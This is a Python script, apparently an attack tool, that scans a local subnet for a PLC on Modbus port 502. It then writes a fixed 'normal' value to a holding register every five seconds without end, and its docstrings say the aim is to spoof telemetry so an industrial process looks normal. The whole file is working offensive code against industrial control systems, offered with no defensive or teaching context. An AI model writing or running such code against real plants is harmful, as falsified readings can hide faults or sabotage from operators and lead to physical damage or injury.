from pymodbus.client.sync import ModbusTcpClient
from pymodbus.payload import BinaryPayloadDecoder
from pymodbus.payload import BinaryPayloadBuilder
from pymodbus.constants import Endian
import time
import socket

def find_plc_ip():
    """
    Scan the local network to find the PLC's IP address.
    This is a basic implementation and may need to be adjusted based on the network setup.
    """
    # Example: Scan a range of IP addresses (e.g., 192.168.1.1 to 192.168.1.255)
    subnet = "192.168.1."
    for i in range(1, 256):
        ip = subnet + str(i)
        try:
            # Attempt to connect to the PLC's Modbus port (default: 502)
            client = ModbusTcpClient(ip, port=502, timeout=1)
            if client.connect():
                print(f"PLC found at IP: {ip}")
                client.close()
                return ip
        except Exception as e:
            continue
    print("PLC not found on the network.")
    return None

def spoof_reporting_message(plc_ip):
    """
    Spoof reporting messages to make it appear that the process is operating normally.
    """
    try:
        # Connect to the PLC
        client = ModbusTcpClient(plc_ip, port=502)
        if not client.connect():
            print("Failed to connect to the PLC.")
            return

        # Spoof telemetry data (e.g., I/O values)
        print("Spoofing reporting messages...")
        while True:
            # Example: Spoof a normal reading for a holding register (address 0)
            builder = BinaryPayloadBuilder(byteorder=Endian.Big, wordorder=Endian.Big)
            builder.add_16bit_int(100)  # Normal value
            payload = builder.to_registers()

            # Write the spoofed value to the holding register
            client.write_registers(address=0, values=payload)

            print("Spoofed message sent: Process operating normally.")
            time.sleep(5)  # Send spoofed messages every 5 seconds

    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        client.close()

if __name__ == "__main__":
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    
    if plc_ip:
        # Step 2: Spoof reporting messages
        spoof_reporting_message(plc_ip)